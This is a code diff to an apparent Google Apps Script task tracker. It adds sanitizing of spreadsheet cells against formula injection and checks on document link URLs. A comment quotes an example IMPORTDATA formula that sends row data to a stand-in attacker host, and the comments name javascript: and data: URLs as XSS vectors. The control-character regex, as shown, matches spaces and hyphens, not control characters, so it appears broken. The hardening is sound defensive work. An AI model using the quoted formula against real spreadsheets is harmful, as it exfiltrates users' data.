@@ -537,6 +537,25 @@ function _buildViewForRole(raw, role, user) {
 // WRITE AUTHORIZATION
 // ════════════════════════════════════════════════════════════════
 // Convierte throws en {success:false, error} para que el frontend reciba
+// Previene formula injection en Sheets. Si un valor empieza con
+// =, +, -, @, tab o CR, Sheets lo evalúa como fórmula. Ej: un usuario
+// que escribe '=IMPORTDATA("https://attacker.com/?d="&A1)' como nombre
+// de tarea exfiltra datos de la fila al renderearla. Mitigation:
+// prefijar con apóstrofo ('), que Sheets trata como texto literal y
+// no muestra. Aplicar a TODO valor que viene del cliente antes de
+// setValue/appendRow. Es no-op para números, booleans, Date, null.
+function _sanitizeCell(v) {
+  if (v == null) return v;
+  if (typeof v === 'number' || typeof v === 'boolean') return v;
+  if (v instanceof Date) return v;
+  var s = String(v);
+  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
+  return s;
+}
+function _sanitizeRow(arr) {
+  return arr.map(_sanitizeCell);
+}
+
 // siempre el mismo contrato (failureHandler deja la UI en estado raro).
 function _safeMutation(fn) {
   try {
@@ -690,12 +709,12 @@ function _addProjectImpl(obj) {
     var equipos = readEquipos(ss);
     var pais  = obj.pais || getCountryForMember(obj.responsable, equipos);
     var lider = obj.lider || getLeaderForCountry(pais, equipos);
-    ws.appendRow([
+    ws.appendRow(_sanitizeRow([
       newId, obj.nombre||'', pais, lider, obj.responsable||'',
       obj.deadline||'', obj.priority||'Media', obj.status||'Activo',
       obj.descripcion||'', obj.notas||'', new Date(), getCurrentWeekLabel(), obj.participantes||'',
       obj.tipoTrabajo||'', obj.riesgo||'', ''
-    ]);
+    ]));
     return {success:true, id:newId, nombre:obj.nombre||''};
   } finally {
     lock.releaseLock();
@@ -713,7 +732,7 @@ function _updateProjectFieldImpl(projId, field, value) {
   var fieldMap = {'nombre':2,'pais':3,'lider':4,'responsable':5,'deadline':6,'priority':7,'status':8,'descripcion':9,'notas':10,'participantes':13,'tipoTrabajo':14,'riesgo':15};
   var col = fieldMap[field];
   if (!col) return { success: false, error: 'Invalid field: ' + field };
-  ws.getRange(current.row, col).setValue(value);
+  ws.getRange(current.row, col).setValue(_sanitizeCell(value));
   return { success: true };
 }
 
@@ -752,7 +771,7 @@ function _updateProjectFieldsImpl(projId, fields) {
     var v = fields[k];
     // participantes puede llegar como array o string csv
     if (k === 'participantes' && Array.isArray(v)) v = v.join(', ');
-    ws.getRange(row, col).setValue(v);
+    ws.getRange(row, col).setValue(_sanitizeCell(v));
   });
   return { success: true };
 }
@@ -830,7 +849,7 @@ function _addTaskImpl(taskObj) {
     // Solo agregamos columnas adicionales si la hoja las tiene; si no, appendRow las omite.
     if (lc >= 17) rowVals.push(''); // Documentos
     if (lc >= 18) rowVals.push(conf); // Confidencialidad
-    ws.appendRow(rowVals);
+    ws.appendRow(_sanitizeRow(rowVals));
     return {success:true, id:newId};
   } finally {
     lock.releaseLock();
@@ -864,7 +883,7 @@ function _updateTaskFieldImpl(taskId, field, value) {
     var n = parseInt(value, 10);
     value = isNaN(n) ? '' : n;
   }
-  ws.getRange(current.row, col).setValue(value);
+  ws.getRange(current.row, col).setValue(_sanitizeCell(value));
   if (field === 'status' && value === 'Listo') {
     ws.getRange(current.row, 10).setValue(new Date());
     moveToHistorial(ctx.ss, ws, current.row);
@@ -907,12 +926,12 @@ function _updateTaskFieldsImpl(taskId, fields) {
       var n = parseInt(v, 10);
       v = isNaN(n) ? '' : n;
     }
-    ws.getRange(row, col).setValue(v);
+    ws.getRange(row, col).setValue(_sanitizeCell(v));
   });
 
   // 2) Status al final (puede disparar move a Historial)
   if (fields.status !== undefined) {
-    ws.getRange(row, 7).setValue(fields.status);
+    ws.getRange(row, 7).setValue(_sanitizeCell(fields.status));
     if (fields.status === 'Listo') {
       ws.getRange(row, 10).setValue(new Date());
       moveToHistorial(ctx.ss, ws, row);
@@ -1144,6 +1163,20 @@ function uploadDocument(kind, itemId, fileData) {
 // Vincula un link existente de Drive (no mueve el archivo).
 function attachDocumentLink(kind, itemId, link) {
   if (!link || !link.url) return { success: false, error: 'URL requerida' };
+  var url = link.url.toString().trim();
+  // Validar esquema: solo http(s). Esto bloquea javascript:, data:, file:, etc.
+  // que podrían ser usados como vector XSS persistente al renderear el link.
+  if (!/^https?:\/\//i.test(url)) {
+    return { success: false, error: 'URL inválida: solo se aceptan https:// o http://' };
+  }
+  // Validar largo razonable (evita DoS por strings gigantes en la celda)
+  if (url.length > 2048) {
+    return { success: false, error: 'URL demasiado larga (máx. 2048 caracteres)' };
+  }
+  // Bloquear caracteres de control que podrían romper el render del atributo HTML
+  if (/[ -]/.test(url)) {
+    return { success: false, error: 'URL contiene caracteres inválidos' };
+  }
   var ctx = _getAuthContext();
   var info = _readDocsFor(kind, itemId);
   if (!info) return { success: false, error: (kind === 'project' ? 'Proyecto' : 'Tarea') + ' #' + itemId + ' no encontrado' };
@@ -1151,9 +1184,9 @@ function attachDocumentLink(kind, itemId, link) {
   else _authorizeProjectWrite(ctx, info.target);
 
   var doc = {
-    name: (link.name || '').toString().trim() || link.url,
-    url: link.url.toString().trim(),
-    id: _extractDriveId(link.url) || '',
+    name: (link.name || '').toString().trim() || url,
+    url: url,
+    id: _extractDriveId(url) || '',
     external: true,
     uploadedBy: ctx.user.name,
     uploadedAt: new Date().toISOString()
@@ -1250,7 +1283,7 @@ function blockTaskById(taskId, reason, slackUser) {
   ws.getRange(current.row, 7).setValue('Bloqueado');
   var prevNotes = ws.getRange(current.row, 11).getValue() || '';
   var stamp = '⛔ ' + (reason || '') + ' (' + (slackUser || '') + ', ' + new Date().toLocaleDateString('es-CO') + ')';
-  ws.getRange(current.row, 11).setValue((prevNotes ? prevNotes + ' | ' : '') + stamp);
+  ws.getRange(current.row, 11).setValue(_sanitizeCell((prevNotes ? prevNotes + ' | ' : '') + stamp));
   return { success: true, id: taskId, nombre: tn, message: 'Tarea bloqueada: #' + taskId + ' "' + tn + '"' };
 }
 function testData() {
